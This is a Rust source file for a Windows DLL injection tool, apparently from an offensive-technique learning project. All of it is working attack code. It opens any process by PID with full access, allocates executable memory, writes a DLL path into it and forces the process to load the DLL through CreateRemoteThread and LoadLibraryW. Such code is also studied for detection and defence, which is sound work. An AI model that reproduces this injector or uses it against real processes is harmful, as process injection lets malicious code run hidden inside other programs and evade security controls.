use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use std::mem::size_of;
use winapi::shared::minwindef::{DWORD, FALSE, FARPROC, HMODULE, LPVOID};
use winapi::shared::ntdef::HANDLE;
use winapi::um::processthreadsapi::{OpenProcess, CreateRemoteThread};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winbase::INFINITE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::minwinbase::LPTHREAD_START_ROUTINE;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut pid: DWORD = 0;
    let mut h_process: HANDLE = null_mut();
    let mut r_buffer: LPVOID = null_mut();

    /* ------------------- [Path to DLL] -------------------- */
    let dll_path: Vec<u16> = OsStr::new(r"C:\Users\Arthur\Documents\crow\dll-injection\target\release\dll_library.dll")
        .encode_wide()
        .chain(Some(0))
        .collect();

    let dll_path_size = dll_path.len() * size_of::<u16>();

    let args = std::env::args().collect::<Vec<String>>();
    let argc = args.len();

    if argc < 2 {
        return Err(format!("[!] usage: {:?} <PID>", args[0]).into());
    }

    pid = args[1].parse::<u32>().map_err(|e| format!("[!] Failed to parse PID: {:?}", e))?;

    println!("[*] Trying to get a handle for the process {:?}", pid);


    /* ------------------- [Open Handle to the process] -------------------- */

    unsafe {
        h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if h_process.is_null() {
            return Err(format!("[!] Couldn't get a handle to the process {}, error: {}", pid, GetLastError()).into());
        }

        println!("[+] Got a handle to the process {:?} -- 0x{:?}", pid, h_process);

    /* ------------------- [Allocate Memory] -------------------- */

        r_buffer = VirtualAllocEx(
            h_process,
            null_mut(),
            dll_path_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if r_buffer.is_null() {
            CloseHandle(h_process);
            return Err(format!("[!] Couldn't allocate memory in target process. Error: {:?}", GetLastError()).into());
        }

        println!("[+] Allocated {:?} bytes with PAGE_EXECUTE_READWRITE permissions", dll_path_size);

    /* ------------------- [Write data in allocated memory] -------------------- */

        let write_result = WriteProcessMemory(h_process, r_buffer, dll_path.as_ptr() as *const _, dll_path_size, null_mut());
        if write_result == 0 {
            CloseHandle(h_process);
            return Err(format!("[!] Failed to write to process memory. Error: {}", GetLastError()).into());
        }

        println!("[+] Wrote DLL path to process memory");

    /* ------------------- [Get a module handler] -------------------- */
        
        let h_kernel32 = GetModuleHandleW(OsStr::new("Kernel32.dll").encode_wide().chain(Some(0)).collect::<Vec<u16>>().as_ptr());
        if h_kernel32.is_null() {
            CloseHandle(h_process);
            return Err(format!("[!] Couldn't get Kernel32.dll. Error: {:?}", GetLastError()).into());
        }

    /* ------------------- [Get process address] -------------------- */

        let start_routine_raw = GetProcAddress(h_kernel32, b"LoadLibraryW\0".as_ptr().cast());
        if start_routine_raw.is_null() {
            CloseHandle(h_process);
            return Err(format!("[!] Couldn't get address of LoadLibraryW. Error: {:?}", GetLastError()).into());
        }

        let start_routine = std::mem::transmute::<FARPROC, LPTHREAD_START_ROUTINE>(start_routine_raw);

    /* ------------------- [Create the thread for the process with our data (DLL)] -------------------- */

        let mut tid: DWORD = 0;
        let h_thread = CreateRemoteThread(h_process, null_mut(), 0, start_routine, r_buffer, 0, &mut tid);
        if h_thread.is_null() {
            CloseHandle(h_process);
            return Err(format!("[!] Couldn't create remote thread. Error: {:?}", GetLastError()).into());
        }

        println!("[*] Got a handle to the newly-created thread {:?} -- 0x{:?}", tid, h_thread);
        println!("[*] Waiting for the thread to finish execution");

        WaitForSingleObject(h_thread, INFINITE);

        println!("[*] Thread finished executing, cleaning up...");
        CloseHandle(h_thread);
        CloseHandle(h_process);

        println!("[*] Finished");
    }

    Ok(())
}
